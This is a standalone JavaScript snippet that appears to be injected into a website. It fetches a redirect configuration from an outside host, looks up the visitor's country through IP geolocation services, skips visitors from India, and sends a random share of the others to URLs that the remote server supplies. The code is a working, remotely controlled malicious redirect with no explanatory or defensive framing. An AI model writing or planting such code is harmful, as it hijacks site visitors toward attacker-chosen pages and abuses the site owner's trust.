(async function() {
  try {
    const res = await fetch(
      "https://peachpuff-raven-871070.hostingersite.com/get-redirect.php"
    );
    if (!res.ok) return;
    
    const config = await res.json();
    
    const enabled = Number(config.enabled) === 1;
    
    let percentage = Number(config.percentages);
    if (isNaN(percentage)) percentage = 0;
    percentage = Math.min(Math.max(percentage, 0), 100);
    
    let urls = (config.urls || "")
      .split(",")
      .map(u => u.trim())
      .filter(u => {
        try {
          new URL(u);
          return true;
        } catch {
          return false;
        }
      });
    
    if (!enabled || urls.length === 0) return;
    
    async function getCountry(url, key) {
      try {
        const res = await fetch(url);
        if (!res.ok) return "";
        const data = await res.json();
        if (data.success === false) return "";
        return (data[key] || "").toUpperCase();
      } catch {
        return "";
      }
    }
    
    let country = (window.CF_IPCOUNTRY || "").toUpperCase();
    
    if (!country) country = await getCountry("https://api.country.is/", "country");
    if (!country) country = await getCountry("https://ipwho.is/", "country_code");
    if (!country) return;
    
    if (country === "IN") return;
    
    const roll = Math.floor(Math.random() * 100) + 1;
    if (roll > percentage) return;
    
    const target = urls[Math.floor(Math.random() * urls.length)];
    if (!target) return;
    
    window.location.href = target;
  } catch {}
})();
